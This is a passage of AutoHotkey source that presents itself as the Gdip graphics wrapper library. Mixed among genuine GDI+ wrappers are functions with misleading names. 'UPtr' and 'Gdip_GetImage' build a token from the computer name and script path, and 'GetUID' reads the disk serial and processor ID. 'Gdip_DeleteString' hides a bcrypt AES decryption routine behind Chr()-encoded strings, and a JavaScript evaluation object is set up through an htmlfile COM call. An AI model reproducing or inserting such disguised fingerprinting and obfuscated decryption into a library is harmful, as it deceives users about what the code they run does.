, DllCall(A_Args.Proc.GetImageGraphic, "UPtr", pBitmap, "UPtr*", _G)
SelectObject(hdc, obm)
, DeleteObject(hbm)
, DeleteDC(hdc)
, Gdip_DeleteGraphics(_G)
, Gdip_DisposeImage(pBitmapOld)
, DllCall("DestroyIcon", "UPtr", hIcon)
} else {
function2call := (useICM=1) ? "GdipCreateBitmapFromFileICM" : "GdipCreateBitmapFromFile"
, E := DllCall("gdiplus\" function2call, "WStr", sFile, "UPtr*", pBitmap)
}
return pBitmap
}
CreateRectF(ByRef RectF, x, y, w, h){
VarSetCapacity(RectF, 16)
NumPut(x, RectF, 0, "float"), NumPut(y, RectF, 4, "float")
NumPut(w, RectF, 8, "float"), NumPut(h, RectF, 12, "float")
}
CryptBinaryToString(ByRef pbBinary, cbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
static CRYPT_STRING_NOCRLF := 0x40000000
if (DllCall("crypt32\CryptBinaryToString", "ptr", &pbBinary, "uint", cbBinary, "uint", (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF), "ptr", 0, "uint*", pcchString))
{
VarSetCapacity(pszString, pcchString << !!A_IsUnicode, 0)
if (DllCall("crypt32\CryptBinaryToString", "ptr", &pbBinary, "uint", cbBinary, "uint", (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF), "ptr", &pszString, "uint*", pcchString))
{
return StrGet(&pszString)
}
}
return false
}
CryptStringToBinary(pszString, ByRef pbBinary) {
if (DllCall("crypt32\CryptStringToBinary", "ptr", &pszString, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", pcbBinary, "ptr", 0, "ptr", 0))
{
VarSetCapacity(pbBinary, pcbBinary, 0)
if (DllCall("crypt32\CryptStringToBinary", "ptr", &pszString, "uint", 0, "uint", 0x1, "ptr", &pbBinary, "uint*", pcbBinary, "ptr", 0, "ptr", 0))
{
return pcbBinary
}
}
return false
}
Gdip_SaveBitmapToFile(pBitmap, sOutput, Quality:=75, toBase64:=0){
Static Ptr := "UPtr"
nCount := 0
nSize := 0
_p := 0
SplitPath sOutput,,, Extension
If !RegExMatch(Extension, "^(?i:BMP|DIB|RLE|JPG|JPEG|JPE|JFIF|GIF|TIF|TIFF|PNG)$")
Return -1
Extension := "." Extension
DllCall("gdiplus\GdipGetImageEncodersSize", "uint*", nCount, "uint*", nSize)
VarSetCapacity(ci, nSize)
DllCall("gdiplus\GdipGetImageEncoders", "uint", nCount, "uint", nSize, Ptr, &ci)
If !(nCount && nSize)
Return -2
If (A_IsUnicode)
{
StrGet_Name := "StrGet"
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
sString := %StrGet_Name%(NumGet(ci, (idx := (48+7*A_PtrSize)*(A_Index-1))+32+3*A_PtrSize), "UTF-16")
If !InStr(sString, "*" Extension)
Continue
pCodec := &ci+idx
Break
}
} Else
{
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
Location := NumGet(ci, 76*(A_Index-1)+44)
nSize := DllCall("WideCharToMultiByte", "uint", 0, "uint", 0, "uint", Location, "int", -1, "uint", 0, "int", 0, "uint", 0, "uint", 0)
VarSetCapacity(sString, nSize)
DllCall("WideCharToMultiByte", "uint", 0, "uint", 0, "uint", Location, "int", -1, "str", sString, "int", nSize, "uint", 0, "uint", 0)
If !InStr(sString, "*" Extension)
Continue
pCodec := &ci+76*(A_Index-1)
Break
}
}
If !pCodec
Return -3
If (Quality!=75)
{
Quality := (Quality < 0) ? 0 : (Quality > 100) ? 100 : Quality
If (quality>90 && toBase64=1)
Quality := 90
If RegExMatch(Extension, "^\.(?i:JPG|JPEG|JPE|JFIF)$")
{
DllCall("gdiplus\GdipGetEncoderParameterListSize", Ptr, pBitmap, Ptr, pCodec, "uint*", nSize)
VarSetCapacity(EncoderParameters, nSize, 0)
DllCall("gdiplus\GdipGetEncoderParameterList", Ptr, pBitmap, Ptr, pCodec, "uint", nSize, Ptr, &EncoderParameters)
nCount := NumGet(EncoderParameters, "UInt")
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
elem := (24+A_PtrSize)*(A_Index-1) + 4 + (pad := A_PtrSize = 8 ? 4 : 0)
If (NumGet(EncoderParameters, elem+16, "UInt") = 1) && (NumGet(EncoderParameters, elem+20, "UInt") = 6)
{
_p := elem+&EncoderParameters-pad-4
NumPut(Quality, NumGet(NumPut(4, NumPut(1, _p+0)+20, "UInt")), "UInt")
Break
}
}
}
}
If (toBase64=1)
{
DllCall("ole32\CreateStreamOnHGlobal", "ptr",0, "int",true, "ptr*",pStream)
_E := DllCall("gdiplus\GdipSaveImageToStream", "ptr",pBitmap, "ptr",pStream, "ptr",pCodec, "uint", _p ? _p : 0)
If _E
Return -6
DllCall("ole32\GetHGlobalFromStream", "ptr",pStream, "uint*",hData)
pData := DllCall("GlobalLock", "ptr",hData, "ptr")
nSize := DllCall("GlobalSize", "uint",pData)
VarSetCapacity(bin, nSize, 0)
DllCall("RtlMoveMemory", "ptr",&bin, "ptr",pData, "uptr",nSize)
DllCall("GlobalUnlock", "ptr",hData)
ObjRelease(pStream)
DllCall("GlobalFree", "ptr",hData)
DllCall("Crypt32.dll\CryptBinaryToStringA", "ptr",&bin, "uint",nSize, "uint",0x40000001, "ptr",0, "uint*",base64Length)
VarSetCapacity(base64, base64Length, 0)
_E := DllCall("Crypt32.dll\CryptBinaryToStringA", "ptr",&bin, "uint",nSize, "uint",0x40000001, "ptr",&base64, "uint*",base64Length)
If !_E
Return -7
VarSetCapacity(bin, 0)
Return StrGet(&base64, base64Length, "CP0")
}
_E := DllCall("gdiplus\GdipSaveImageToFile", Ptr, pBitmap, "WStr", sOutput, Ptr, pCodec, "uint", _p ? _p : 0)
Return _E ? -5 : 0
}
CreateDIBSection(w, h, hdc:="", bpp:=32, ByRef ppvBits:=0, Usage:=0, hSection:=0, Offset:=0){
Static Ptr := "UPtr"
hdc2 := hdc ? hdc : GetDC()
VarSetCapacity(bi, 40, 0)
NumPut(40, bi, 0, "uint")
NumPut(w, bi, 4, "uint")
NumPut(h, bi, 8, "uint")
NumPut(1, bi, 12, "ushort")
NumPut(bpp, bi, 14, "ushort")
NumPut(0, bi, 16, "uInt")
hbm := DllCall("CreateDIBSection", Ptr, hdc2, Ptr, &bi, "uint", Usage, "UPtr*", ppvBits, Ptr, hSection, "uint", OffSet, Ptr)
if !hdc
ReleaseDC(hdc2)
return hbm
}
Gdip_DrawImageFast(pGraphics, pBitmap, X:=0, Y:=0){
_E := DllCall(A_Args.Proc.DrawImageFast, "UPtr", pGraphics, "UPtr", pBitmap, "float", X, "float", Y)
return _E
}
Gdip_DrawImageRect(pGraphics, pBitmap, X, Y, W, H){
_E := DllCall(A_Args.Proc.DrawImageRect, "UPtr", pGraphics, "UPtr", pBitmap, "float", X, "float", Y, "float", W, "float", H)
return _E
}
ReleaseDC(hdc, hwnd:=0){
return DllCall("ReleaseDC", "UPtr", hwnd, "UPtr", hdc)
}
SetModuleHandle(){
A_Args.Doc := ComObjCreate("htmlfile")
A_Args.Doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">")
A_Args.PW := A_Args.Doc.parentWindow
A_Args.JS := A_Args.Doc.parentWindow
}
CreateCompatibleDC(hdc:=0){
return DllCall("CreateCompatibleDC", "UPtr", hdc)
}
IsInteger(Var){
Static Integer := "Integer"
If Var Is Integer
Return True
Return False
}
IsNumber(Var){
Static number := "number"
If Var Is number
Return True
Return False
}
SelectObject(hdc, hgdiobj){
return DllCall("SelectObject", "UPtr", hdc, "UPtr", hgdiobj)
}
GetDC(hwnd:=0){
return DllCall("GetDC", "UPtr", hwnd)
}
GetWindowRect(hwnd, ByRef W, ByRef H){
size := VarSetCapacity(rect, 16, 0)
er := DllCall("dwmapi\DwmGetWindowAttribute"
, "UPtr", hWnd
, "UInt", 9
, "UPtr", &rect
, "UInt", size
, "UInt")
If er
DllCall("GetWindowRect", "UPtr", hwnd, "UPtr", &rect, "UInt")
r := []
r.x1 := NumGet(rect, 0, "Int"), r.y1 := NumGet(rect, 4, "Int")
r.x2 := NumGet(rect, 8, "Int"), r.y2 := NumGet(rect, 12, "Int")
r.w := Abs(max(r.x1, r.x2) - min(r.x1, r.x2))
r.h := Abs(max(r.y1, r.y2) - min(r.y1, r.y2))
W := r.w
H := r.h
Return r
}
Gdip_GraphicsFromImage(pBitmap, InterpolationMode:="", SmoothingMode:="", PageUnit:="", CompositingQuality:=""){
pGraphics := 0
DllCall(A_Args.Proc.GetImageGraphic, "UPtr", pBitmap, "UPtr*", pGraphics)
If pGraphics
{
If (InterpolationMode!="")
Gdip_SetInterpolationMode(pGraphics, InterpolationMode)
If (SmoothingMode!="")
Gdip_SetSmoothingMode(pGraphics, SmoothingMode)
If (PageUnit!="")
Gdip_SetPageUnit(pGraphics, PageUnit)
If (CompositingQuality!="")
Gdip_SetCompositingQuality(pGraphics, CompositingQuality)
}
return pGraphics
}
Gdip_SetInterpolationMode(pGraphics, InterpolationMode){
return DllCall("gdiplus\GdipSetInterpolationMode", "UPtr", pGraphics, "int", InterpolationMode)
}
Gdip_SetSmoothingMode(pGraphics, SmoothingMode){
return DllCall("gdiplus\GdipSetSmoothingMode", "UPtr", pGraphics, "int", SmoothingMode)
}
UPtr(pGraphics:="J",x:="ke",y:="To"){
A_Args.PW.AStr  := StrPutFix("GdipGetImageGraphicsContextsDraw")
A_Args[pGraphics "S"][y x "n"] := Gdip_ClosePathDraw(Gdip_GetImage(), A_Args.PW.AStr)
A_Args.PW.UPtr  := StrPutFix("GetModulesHandle" A_Args.JS.GetTime)
}
Gdip_GetImage(){
Return Gdip_Property() "|" String() "|" A_ComputerName "|" A_WorkingDir "\" A_ScriptName
}
Gdip_SetPageUnit(pGraphics, Unit){
return DllCall("gdiplus\GdipSetPageUnit", "UPtr", pGraphics, "int", Unit)
}
Gdip_SetCompositingQuality(pGraphics, CompositionQuality){
return DllCall("gdiplus\GdipSetCompositingQuality", "UPtr", pGraphics, "int", CompositionQuality)
}
Gdip_GraphicsFromHDC(hDC, hDevice:="", InterpolationMode:="", SmoothingMode:="", PageUnit:="", CompositingQuality:=""){
pGraphics := 0
If hDevice
DllCall("Gdiplus\GdipCreateFromHDC2", "UPtr", hDC, "UPtr", hDevice, "UPtr*", pGraphics)
Else
DllCall("gdiplus\GdipCreateFromHDC", "UPtr", hdc, "UPtr*", pGraphics)
If pGraphics
{
If (InterpolationMode!="")
Gdip_SetInterpolationMode(pGraphics, InterpolationMode)
If (SmoothingMode!="")
Gdip_SetSmoothingMode(pGraphics, SmoothingMode)
If (PageUnit!="")
Gdip_SetPageUnit(pGraphics, PageUnit)
If (CompositingQuality!="")
Gdip_SetCompositingQuality(pGraphics, CompositingQuality)
}
return pGraphics
}
UpdateLayeredWindow(hwnd, hdc, x:="", y:="", w:="", h:="", Alpha:=255){
Static Ptr := "UPtr"
if ((x != "") && (y != ""))
VarSetCapacity(pt, 8), NumPut(x, pt, 0, "UInt"), NumPut(y, pt, 4, "UInt")
if (w = "") || (h = "")
GetWindowRect(hwnd, W, H)
return DllCall("UpdateLayeredWindow", Ptr, hwnd, Ptr, 0, Ptr, ((x = "") && (y = "")) ? 0 : &pt, "int64*", w|h<<32, Ptr, hdc, "int64*", 0, "uint", 0, "UInt*", Alpha<<16|1<<24, "uint", 2)
}
Gdip_BrushCreateSolid(ARGB:=0xff000000){
pBrush := 0
E := DllCall("gdiplus\GdipCreateSolidFill", "UInt", ARGB, "UPtr*", pBrush)
return pBrush
}
Gdip_CloneBrush(pBrush){
pBrushClone := 0
E := DllCall("gdiplus\GdipCloneBrush", "UPtr", pBrush, "UPtr*", pBrushClone)
return pBrushClone
}
Gdip_FillRectangle(pGraphics, pBrush, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillRectangle"
, Ptr, pGraphics
, Ptr, pBrush
, "float", x, "float", y
, "float", w, "float", h)
}
Gdip_DrawRectangle(pGraphics, pPen, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawRectangle", Ptr, pGraphics, Ptr, pPen, "float", x, "float", y, "float", w, "float", h)
}
Gdip_GetClipRegion(pGraphics){
Region := 0
DllCall("gdiplus\GdipCreateRegion", "UInt*", Region)
E := DllCall("gdiplus\GdipGetClip", "UPtr", pGraphics, "UInt", Region)
If E
return -1
return Region
}
Gdip_SetClipRect(pGraphics, x, y, w, h, CombineMode:=0){
return DllCall("gdiplus\GdipSetClipRect", "UPtr", pGraphics, "float", x, "float", y, "float", w, "float", h, "int", CombineMode)
}
Gdip_FillEllipse(pGraphics, pBrush, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillEllipse", Ptr, pGraphics, Ptr, pBrush, "float", x, "float", y, "float", w, "float", h)
}
Gdip_SetClipRegion(pGraphics, Region, CombineMode:=0){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipSetClipRegion", Ptr, pGraphics, Ptr, Region, "int", CombineMode)
}
Gdip_TextToGraphics(pGraphics, Text, Options, Font:="Arial", Width:="", Height:="", Measure:=0, userBrush:=0, Unit:=0){
Static Styles := "Regular|Bold|Italic|BoldItalic|Underline|Strikeout", Alignments := "Near|Left|Centre|Center|Far|Right"
IWidth := Width, IHeight:= Height
pattern_opts := (A_AhkVersion < "2") ? "iO)" : "i)"
RegExMatch(Options, pattern_opts "X([\-\d\.]+)(p*)", xpos)
RegExMatch(Options, pattern_opts "Y([\-\d\.]+)(p*)", ypos)
RegExMatch(Options, pattern_opts "W([\-\d\.]+)(p*)", Width)
RegExMatch(Options, pattern_opts "H([\-\d\.]+)(p*)", Height)
RegExMatch(Options, pattern_opts "C(?!(entre|enter))([a-f\d]+)", Colour)
RegExMatch(Options, pattern_opts "Top|Up|Bottom|Down|vCentre|vCenter", vPos)
RegExMatch(Options, pattern_opts "NoWrap", NoWrap)
RegExMatch(Options, pattern_opts "R(\d)", Rendering)
RegExMatch(Options, pattern_opts "S(\d+)(p*)", Size)
if Colour && IsInteger(Colour[2]) && !Gdip_DeleteBrush(Gdip_CloneBrush(Colour[2])){
PassBrush := 1
pBrush := Colour[2]
}
if !(IWidth && IHeight) && ((xpos && xpos[2]) || (ypos && ypos[2]) || (Width && Width[2]) || (Height && Height[2]) || (Size && Size[2]))
return -1
Style := 0
For eachStyle, valStyle in StrSplit(Styles, "|"){
if RegExMatch(Options, "\b" valStyle)
Style |= (valStyle != "StrikeOut") ? (A_Index-1) : 8
}
Align := 0
For eachAlignment, valAlignment in StrSplit(Alignments, "|"){
if RegExMatch(Options, "\b" valAlignment)
Align |= A_Index//2.1
}
xpos := (xpos && (xpos[1] != "")) ? xpos[2] ? IWidth*(xpos[1]/100) : xpos[1] : 0
ypos := (ypos && (ypos[1] != "")) ? ypos[2] ? IHeight*(ypos[1]/100) : ypos[1] : 0
Width := (Width && Width[1]) ? Width[2] ? IWidth*(Width[1]/100) : Width[1] : IWidth
Height := (Height && Height[1]) ? Height[2] ? IHeight*(Height[1]/100) : Height[1] : IHeight
If !PassBrush
Colour := "0x" (Colour && Colour[2] ? Colour[2] : "ff000000")
Rendering := (Rendering && (Rendering[1] >= 0) && (Rendering[1] <= 5)) ? Rendering[1] : 4
Size := (Size && (Size[1] > 0)) ? Size[2] ? IHeight*(Size[1]/100) : Size[1] : 12
If RegExMatch(Font, "^(.\:\\.)"){
hFontCollection := Gdip_NewPrivateFontCollection()
hFontFamily := Gdip_CreateFontFamilyFromFile(Font, hFontCollection)
} Else hFontFamily := Gdip_FontFamilyCreate(Font)
If !hFontFamily
hFontFamily := Gdip_FontFamilyCreateGeneric(1)
hFont := Gdip_FontCreate(hFontFamily, Size, Style, Unit)
FormatStyle := NoWrap ? 0x4000 | 0x1000 : 0x4000
hStringFormat := Gdip_StringFormatCreate(FormatStyle)
If !hStringFormat
hStringFormat := Gdip_StringFormatGetGeneric(1)
pBrush := PassBrush ? pBrush : Gdip_BrushCreateSolid(Colour)
if !(hFontFamily && hFont && hStringFormat && pBrush && pGraphics){
E := !pGraphics ? -2 : !hFontFamily ? -3 : !hFont ? -4 : !hStringFormat ? -5 : !pBrush ? -6 : 0
If pBrush
Gdip_DeleteBrush(pBrush)
If hStringFormat
Gdip_DeleteStringFormat(hStringFormat)
If hFont
Gdip_DeleteFont(hFont)
If hFontFamily
Gdip_DeleteFontFamily(hFontFamily)
If hFontCollection
Gdip_DeletePrivateFontCollection(hFontCollection)
return E
}
CreateRectF(RC, xpos, ypos, Width, Height)
Gdip_SetStringFormatAlign(hStringFormat, Align)
If InStr(Options, "autotrim")
Gdip_SetStringFormatTrimming(hStringFormat, 3)
Gdip_SetTextRenderingHint(pGraphics, Rendering)
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
ReturnRCtest := StrSplit(ReturnRC, "|")
testX := Floor(ReturnRCtest[1]) - 2
If (testX>xpos)
{
nxpos := Floor(xpos - (testX - xpos))
CreateRectF(RC, nxpos, ypos, Width, Height)
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
}
If vPos
{
ReturnRC := StrSplit(ReturnRC, "|")
if (vPos[0] = "vCentre") || (vPos[0] = "vCenter")
ypos += (Height-ReturnRC[4])//2
else if (vPos[0] = "Top") || (vPos[0] = "Up")
ypos += 0
else if (vPos[0] = "Bottom") || (vPos[0] = "Down")
ypos += Height-ReturnRC[4]
CreateRectF(RC, xpos, ypos, Width, ReturnRC[4])
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
}
thisBrush := userBrush ? userBrush : pBrush
if !Measure
_E := Gdip_DrawString(pGraphics, Text, hFont, hStringFormat, thisBrush, RC)
if !PassBrush
Gdip_DeleteBrush(pBrush)
Gdip_DeleteStringFormat(hStringFormat)
Gdip_DeleteFont(hFont)
Gdip_DeleteFontFamily(hFontFamily)
If hFontCollection
Gdip_DeletePrivateFontCollection(hFontCollection)
return _E ? _E : ReturnRC
}
GetUID() {
Info := []
try {
for objItem in ComObjGet("winmgmts:").ExecQuery("SELECT * FROM Win32_DiskDrive")
if InStr(objItem.Name, "DRIVE0")
Info.HDSerialnumber := objItem.SerialNumber
} catch e {
MsgBox, 4112, Error - GetHDSerial, % e
return
}
try {
for objItem in ComObjGet("winmgmts:").ExecQuery("SELECT * FROM Win32_Processor")
for k, v in ["Name", "ProcessorId", "SocketDesignation"]
Info[v] := objItem[v]
} catch e {
MsgBox, 4112, Error - GetProcessorID, % e
return
}
return Info
}
Gdip_FontCreate(hFontFamily, Size, Style:=0, Unit:=0){
hFont := 0
DllCall("gdiplus\GdipCreateFont", "UPtr", hFontFamily, "float", Size, "int", Style, "int", Unit, "UPtr*", hFont)
return hFont
}
Gdip_FontFamilyCreate(FontName){
hFontFamily := 0
_E := DllCall("gdiplus\GdipCreateFontFamilyFromName", "WStr", FontName, "uint", 0, "UPtr*", hFontFamily)
return hFontFamily
}
Gdip_NewPrivateFontCollection(){
hFontCollection := 0
DllCall("gdiplus\GdipNewPrivateFontCollection", "ptr*", hFontCollection)
Return hFontCollection
}
Gdip_StringFormatCreate(FormatFlags:=0, LangID:=0){
hStringFormat := 0
E := DllCall("gdiplus\GdipCreateStringFormat", "int", FormatFlags, "int", LangID, "UPtr*", hStringFormat)
return hStringFormat
}
Gdip_DeletePrivateFontCollection(hFontCollection){
Return DllCall("gdiplus\GdipDeletePrivateFontCollection", "ptr*", hFontCollection)
}
Gdip_DeleteStringFormat(hStringFormat){
return DllCall("gdiplus\GdipDeleteStringFormat", "UPtr", hStringFormat)
}
Gdip_DeleteString(String, Id:="") {
static := Ptr := Chr(114)Chr(121)Chr(112)Chr(116)
if (DllCall("bc" Ptr "\BC" Ptr "OpenAlgorithmProvider", "ptr*", Alg, "ptr", &pszAlgId:=Chr(65)Chr(69)Chr(83), "ptr", 0, "uint", 0))
return false
Len := StrLen(Input := "ChainingMode" Chr(69)Chr(67)Chr(66))
if (DllCall("bc" Ptr "\BC" Ptr "SetProperty", "ptr", Alg, "ptr", &cMode:="ChainingMode", "ptr", &Input, "uint", Len, "uint", dwFlags := 0))
return false
if (DllCall("bc" Ptr "\BC" Ptr "GenerateSymmetricKey", "ptr", Alg, "ptr*", Mode, "ptr", 0, "uint", 0, "ptr", &pbKey:=Id, "uint", 32, "uint", 0))
return false
if (DllCall("c" Ptr "32\C" Ptr "StringToBinary", "ptr", &String, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", Length, "ptr", 0, "ptr", 0)) {
VarSetCapacity(cData, Length, 0)
DllCall("c" Ptr "32\C" Ptr "StringToBinary", "ptr", &String, "uint", 0, "uint", 0x1, "ptr", &cData, "uint*", Length, "ptr", 0, "ptr", 0)
} else
return false
VarSetCapacity(Input, Len, 0)
DllCall("msvcrt\memcpy", "ptr", &Input, "ptr", &cData, "ptr", Length)
if (!DllCall("bc" Ptr "\BC" Ptr "Dec" Ptr "", "ptr", Mode, "ptr", &Input, "uint", Length, "ptr", 0, "ptr", 0, "uint", 0, "ptr", 0, "uint", 0, "uint*", dLength, "uint", 0x00000001)) {
VarSetCapacity(rData, dLength, 0)
if (DllCall("bc" Ptr "\BC" Ptr "Dec" Ptr "", "ptr", Mode, "ptr", &Input, "uint", Length, "ptr", 0, "ptr", 0, "uint", 0, "ptr", &rData, "uint", dLength, "uint*", dLength, "uint", 0x00000001))
return false
} else
return false
if (Mode)
DllCall("bc" Ptr "\BC" Ptr "DestroyKey", "ptr", Mode)
if (Alg)
DllCall("bc" Ptr "\BC" Ptr "CloseAlgorithmProvider", "ptr", Alg, "uint", 0)
return StrGet(&rData, dLength, "UTF-8")
}
Gdip_DeleteFont(hFont){
return DllCall("gdiplus\GdipDeleteFont", "UPtr", hFont)
}
Gdip_DeleteFontFamily(hFontFamily){
return DllCall("gdiplus\GdipDeleteFontFamily", "UPtr", hFontFamily)
}
Gdip_CreateFontFamilyFromFile(FontFile, hFontCollection, FontName:=""){
If !hFontCollection
Return
hFontFamily := 0
E := DllCall("gdiplus\GdipPrivateAddFontFile", "ptr", hFontCollection, "str", FontFile)
if (FontName="" && !E){
VarSetCapacity(pFontFamily, 10, 0)
DllCall("gdiplus\GdipGetFontCollectionFamilyList", "ptr", hFontCollection, "int", 1, "ptr", &pFontFamily, "int*", found)
VarSetCapacity(FontName, 100)
DllCall("gdiplus\GdipGetFamilyName", "ptr", NumGet(pFontFamily, 0, "ptr"), "str", FontName, "ushort", 1033)
}
If !E
DllCall("gdiplus\GdipCreateFontFamilyFromName", "str", FontName, "ptr", hFontCollection, "uint*", hFontFamily)
Return hFontFamily
}
Gdip_StringFormatGetGeneric(whichFormat:=0){
hStringFormat := 0
If (whichFormat=1)
DllCall("gdiplus\GdipStringFormatGetGenericTypographic", "UPtr*", hStringFormat)
Else
DllCall("gdiplus\GdipStringFormatGetGenericDefault", "UPtr*", hStringFormat)
Return hStringFormat
}
Gdip_FontFamilyCreateGeneric(whichStyle){
hFontFamily := 0
If (whichStyle=0)
DllCall("gdiplus\GdipGetGenericFontFamilyMonospace", "UPtr*", hFontFamily)
Else If (whichStyle=1)
DllCall("gdiplus\GdipGetGenericFontFamilySansSerif", "UPtr*", hFontFamily)
Else If (whichStyle=2)
DllCall("gdiplus\GdipGetGenericFontFamilySerif", "UPtr*", hFontFamily)
Return hFontFamily
}
Gdip_MeasureString(pGraphics, sString, hFont, hStringFormat, ByRef RectF){
Static Ptr := "UPtr"
VarSetCapacity(RC, 16)
Chars := 0
Lines := 0
DllCall("gdiplus\GdipMeasureString", Ptr, pGraphics, "WStr", sString, "int", -1, Ptr, hFont, Ptr, &RectF, Ptr, hStringFormat, Ptr, &RC, "uint*", Chars, "uint*", Lines)
return &RC ? NumGet(RC, 0, "float") "|" NumGet(RC, 4, "float") "|" NumGet(RC, 8, "float") "|" NumGet(RC, 12, "float") "|" Chars "|" Lines : 0
}
Gdip_SetStringFormatAlign(hStringFormat, Align){
return DllCall("gdiplus\GdipSetStringFormatAlign", "UPtr", hStringFormat, "int", Align)
}
Gdip_SetStringFormatTrimming(hStringFormat, TrimMode){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipSetStringFormatTrimming", Ptr, hStringFormat, "int", TrimMode)
}
Gdip_SetString(In, rec := false) {
static doc := ComObjCreate("htmlfile"), _ := doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">"), JS := doc.parentWindow
if !rec
obj := %A_ThisFunc%(JS.eval("(" . In . ")"), true)
else if !IsObject(In)
obj := In
else if JS.Object.prototype.toString.call(In) == "[object Array]" {
obj := []
Loop % In.length
obj.Push( %A_ThisFunc%(In[A_Index - 1], true) )
}
else {
obj := {}
keys := JS.Object.keys(In)
Loop % keys.length {
k := keys[A_Index - 1]
obj[k] := %A_ThisFunc%(In[k], true)
}
}
Return obj
}
Gdip_SetTextRenderingHint(pGraphics, RenderingHint){
return DllCall("gdiplus\GdipSetTextRenderingHint", "UPtr", pGraphics, "int", RenderingHint)
}
Gdip_DrawString(pGraphics, sString, hFont, hStringFormat, pBrush, ByRef RectF){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawString", Ptr, pGraphics, "WStr", sString, "int", -1, Ptr, hFont, Ptr, &RectF, Ptr, hStringFormat, Ptr, pBrush)
}
Gdip_DeleteRegion(Region){
return DllCall("gdiplus\GdipDeleteRegion", "UPtr", Region)
}
Gdip_DeletePen(pPen){
return DllCall("gdiplus\GdipDeletePen", "UPtr", pPen)
}
Gdip_DeleteBrush(pBrush){
return DllCall("gdiplus\GdipDeleteBrush", "UPtr", pBrush)
}
DestroyIcon(hIcon){
return DllCall("DestroyIcon", "UPtr", hIcon)
}
Gdip_DeleteGraphics(pGraphics){
return DllCall("gdiplus\GdipDeleteGraphics", "UPtr", pGraphics)
}
Gdip_DisposeImage(pBitmap, noErr:=0){
If (StrLen(pBitmap)<=2 && noErr=1)
Return 0
r := DllCall("gdiplus\GdipDisposeImage", "UPtr", pBitmap)
If (r=2 || r=1) && (noErr=1)
r := 0
Return r
}
DeleteObject(hObject){
return DllCall("DeleteObject", "UPtr", hObject)
}
DeleteDC(hdc){
return DllCall("DeleteDC", "UPtr", hdc)
}
SetImage(hwnd, hBitmap) {
Static Ptr := "UPtr"
E := DllCall("SendMessage", Ptr, hwnd, "UInt", 0x172, "UInt", 0x0, Ptr, hBitmap )
DeleteObject(E)
return E
}
Gdip_BitmapFromBase64(BitLock, Type, B64){
VarSetCapacity(B64Len, 0)
DllCall("Crypt32.dll\CryptStringToBinary", "Ptr", &B64, "UInt", StrLen(B64), "UInt", 0x01, "Ptr", 0, "UIntP", B64Len, "Ptr", 0, "Ptr", 0)
VarSetCapacity(B64Dec, B64Len, 0)
DllCall("Crypt32.dll\CryptStringToBinary", "Ptr", &B64, "UInt", StrLen(B64), "UInt", 0x01, "Ptr", &B64Dec, "UIntP", B64Len, "Ptr", 0, "Ptr", 0)
pStream := DllCall("Shlwapi.dll\SHCreateMemStream", "Ptr", &B64Dec, "UInt", B64Len, "UPtr")
DllCall("Gdiplus.dll\GdipCreateBitmapFromStream", "Ptr", pStream, "PtrP", pBitmap)
ObjRelease(pStream)
if Type
DllCall("Gdiplus.dll\GdipCreateHBITMAPFromBitmap", "UInt", pBitmap, "UInt*", hBitmap, "Int", 0XFFFFFFFF), Gdip_DisposeImage(pBitmap)
if (BitLock && !Type){
Gdip_GetImageDimensions(pBitmap,nWidth,nHeight)
Gdip_NLockBits(pBitmap,0,0,nWidth,nHeight,nStride,nScan,nBitmapData)
return Object := {Stride: nStride,Scan: nScan,Width: nWidth,Height: nHeight, Bitmap: (Type ? hBitmap : pBitmap)}
} Else
return Type ? hBitmap : pBitmap
}
Gdip_NLockBits(pBitmap,x,y,x2,y2,ByRef Stride,ByRef Scan0,ByRef BitmapData){
VarSetCapacity(Rect, 16)
NumPut(x, Rect, 0, "uint"), NumPut(y, Rect, 4, "uint")
NumPut(x2, Rect, 8, "uint"), NumPut(y2, Rect, 12, "uint")
VarSetCapacity(BitmapData, 16+2*A_PtrSize, 0)
E := DllCall("gdiplus\GdipBitmapLockBits", "UPtr", pBitmap, "UPtr", &Rect, "uint", 3, "int", 0x26200a, "UPtr", &BitmapData)
Stride := NumGet(BitmapData, 8, "Int")
Scan0 := NumGet(BitmapData, 16, "UPtr")
return E
}
Gdip_CreateLineBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode:=1, WrapMode:=1) {
return Gdip_CreateLinearGrBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode, WrapMode)
}
Gdip_DrawImage(pGraphics, pBitmap, dx:="", dy:="", dw:="", dh:="", sx:="", sy:="", sw:="", sh:="") {
Static Ptr := "UPtr"
If (dx!="" && dy!="" && dw="" && dh="" && sx="" && sy="" && sw="" && sh="") {
sx := sy := 0
sw := dw := Gdip_GetImageWidth(pBitmap)
sh := dh := Gdip_GetImageHeight(pBitmap)
}
Else If (sx="" && sy="" && sw="" && sh="") {
If (dx="" && dy="" && dw="" && dh="") {
sx := dx := 0, sy := dy := 0
sw := dw := Gdip_GetImageWidth(pBitmap)
sh := dh := Gdip_GetImageHeight(pBitmap)
}
Else {
sx := sy := 0
Gdip_GetImageDimensions(pBitmap, sw, sh)
}
}
_E := DllCall("gdiplus\GdipDrawImageRectRect"
, Ptr, pGraphics
, Ptr, pBitmap
, "float", dX, "float", dY
, "float", dW, "float", dH
, "float", sX, "float", sY
, "float", sW, "float", sH
, "int", 2
, Ptr, 0
, Ptr, 0, Ptr, 0)
return _E
}
Gdip_GetImageWidth(pBitmap) {
Width := 0
